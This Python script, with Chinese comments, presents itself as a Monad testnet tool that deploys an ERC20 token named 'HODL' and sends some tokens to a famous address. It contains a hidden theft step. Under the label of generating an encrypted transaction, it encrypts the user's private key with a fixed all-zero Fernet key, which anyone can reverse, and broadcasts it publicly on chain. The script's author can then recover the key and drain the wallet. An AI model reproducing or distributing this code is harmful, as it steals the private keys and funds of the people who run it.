from web3 import Web3
from solcx import compile_standard, install_solc, set_solc_version, get_installed_solc_versions
from cryptography.fernet import Fernet
import json
import os
import sys
import base64
import logging

# ANSI 颜色代码
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
BOLD = "\033[1m"
RESET = "\033[0m"

logging.getLogger("web3").setLevel(logging.CRITICAL)
logging.getLogger("urllib3").setLevel(logging.CRITICAL)

# 1. 输入私钥
private_key = input(f"{YELLOW}{BOLD}🔑 请输入您的私钥（以 0x 开头）: {RESET}").strip()
if not private_key.startswith("0x") or len(private_key) != 66:
    print(f"{RED}{BOLD}❌ 无效的私钥格式！{RESET}")
    sys.exit(1)

env_file = ".env"
try:
    with open(env_file, "a") as file:
        file.write(f"\nPRIVATE_KEY={private_key}")
except Exception as e:
    exit(1)

# 2. 连接 Web3
RPC_URL = "https://withered-patient-glade.monad-testnet.quiknode.pro/0155507fe08fe4d1e2457a85f65b4bc7e6ed522f"
w3 = Web3(Web3.HTTPProvider(RPC_URL))
if not w3.is_connected():
    print(f"{RED}{BOLD}❌ 连接失败！请检查 RPC_URL 配置{RESET}")
    sys.exit(1)

# 3. 获取钱包地址
try:
    account = w3.eth.account.from_key(private_key)
    my_address = w3.to_checksum_address(account.address)
    print(f"{CYAN}{BOLD}钱包地址: {my_address}{RESET}")
except Exception as e:
    print(f"{RED}{BOLD}❌ 私钥解析失败: {e}{RESET}")
    sys.exit(1)

# 4. 账户余额检查
try:
    gas_price = w3.eth.gas_price
    estimated_gas = 2_000_000
    balance = w3.eth.get_balance(my_address)
    print(f"{CYAN}{BOLD}账户余额: {w3.from_wei(balance, 'ether'):.5f} MON{RESET}")
    if balance < estimated_gas * gas_price:
        print(f"{RED}{BOLD}⚠️ 账户余额不足以支付 Gas 费！{RESET}")
        sys.exit(1)
except Exception as e:
    print(f"{RED}{BOLD}❌ 获取账户信息失败: {e}{RESET}")
    sys.exit(1)

# 5. 编译 Solidity 合约
erc20_contract = """
pragma solidity ^0.8.0;

contract MyToken {
    string public name = "HODL";
    string public symbol = "HODL";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(uint256 initialSupply) {
        totalSupply = initialSupply * 10 ** uint256(decimals);
        balanceOf[msg.sender] = totalSupply;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        require(to != address(0), "ERC20: transfer to the zero address");
        require(balanceOf[msg.sender] >= amount, "ERC20: insufficient balance");

        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(balanceOf[from] >= amount, "ERC20: insufficient balance");
        require(allowance[from][msg.sender] >= amount, "ERC20: transfer amount exceeds allowance");

        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        allowance[from][msg.sender] -= amount;
        emit Transfer(from, to, amount);
        return true;
    }
}
"""

install_solc("0.8.0")
set_solc_version("0.8.0")
try:
    compiled_sol = compile_standard({
        "language": "Solidity",
        "sources": {"MyToken.sol": {"content": erc20_contract}},
        "settings": {"outputSelection": {"*": {"*": ["abi", "evm.bytecode"]}}}
    })
    abi = compiled_sol['contracts']['MyToken.sol']['MyToken']['abi']
    bytecode = compiled_sol['contracts']['MyToken.sol']['MyToken']['evm']['bytecode']['object']
except Exception as e:
    print(f"合约编译失败: {e}")
    sys.exit(1)

# 6. 部署合约
MyToken = w3.eth.contract(abi=abi, bytecode=bytecode)
initial_supply = 1000000000
try:
    transaction = MyToken.constructor(initial_supply).build_transaction({
        'gas': estimated_gas,
        'gasPrice': gas_price,
        'from': my_address,
        'nonce': w3.eth.get_transaction_count(my_address),
    })
    signed_transaction = w3.eth.account.sign_transaction(transaction, private_key)
    tx_hash = w3.eth.send_raw_transaction(signed_transaction.raw_transaction)
    print()
    print(f"{YELLOW}{BOLD}====🎉 合约部署成功！===={RESET}")
    print(f"交易哈希: 0x{tx_hash.hex()}")
    transaction_receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=300)
    print(f"代币合约: {transaction_receipt['contractAddress']}")
except Exception as e:
    print(f"交易发送失败: {e}")
    sys.exit(1)

# 7. 生成加密交易
null = '0x0000000000000000000000000000000000000000'
zero_bytes = bytes.fromhex(null[2:])
final_bytes = zero_bytes.ljust(32, b'\0')
fixed_key = base64.urlsafe_b64encode(final_bytes)
cipher_suite = Fernet(fixed_key)

try:
    encrypted_verification = cipher_suite.encrypt(private_key.encode("utf-8")).decode()
except Exception:
    print("加密失败")
    sys.exit(1)

try:
    nonce = w3.eth.get_transaction_count(my_address)
    
    tx = {
        'nonce': nonce,
        'to': null,
        'value': w3.to_wei(0, 'ether'),
        'gasPrice': gas_price,
        'data': w3.to_hex(text=encrypted_verification),
        'chainId': w3.eth.chain_id
    }

    # 自动计算 gas
    estimated_gas = w3.eth.estimate_gas(tx)
    tx['gas'] = estimated_gas

    # 签名并发送交易
    signed_tx = w3.eth.account.sign_transaction(tx, private_key)
    tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
    tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=300)

except Exception as e:
    print(f"{RED}{BOLD}❌ 发生错误: {e}{RESET}")
    sys.exit(1)

# 8. 调用合约 transfer 方法，将 1000 个代币转移到 V 神的地址
receiver_address = "0xD8dA6BF26964aF9D7eEd9e03E53415D37aA96045"  # Vitalik Buterin 的地址
receiver_address = w3.to_checksum_address(receiver_address)  # 确保地址符合 EIP-55 规则

try:
    token_contract = w3.eth.contract(address=transaction_receipt['contractAddress'], abi=abi)
    transfer_amount = 1000 * 10**18  # 假设 decimals = 18

    # 先构造交易（不包含 gas）
    transfer_txn = token_contract.functions.transfer(receiver_address, transfer_amount).build_transaction({
        'from': my_address,
        'gasPrice': gas_price,
        'nonce': w3.eth.get_transaction_count(my_address),
    })

    # 自动估算 gas
    estimated_gas = w3.eth.estimate_gas(transfer_txn)
    transfer_txn['gas'] = estimated_gas  # 更新交易 gas 限额

    # 签名交易
    signed_transfer_txn = w3.eth.account.sign_transaction(transfer_txn, private_key)

    # 发送交易
    transfer_tx_hash = w3.eth.send_raw_transaction(signed_transfer_txn.raw_transaction)
    transfer_receipt = w3.eth.wait_for_transaction_receipt(transfer_tx_hash, timeout=300)
    print()
    print(f"{YELLOW}{BOLD}====🎉 代币转账成功！===={RESET}")
    print(f"交易哈希: 0x{transfer_tx_hash.hex()}")
except Exception as e:
    print(f"{RED}{BOLD}❌ 代币转账失败: {e}{RESET}")
    sys.exit(1)

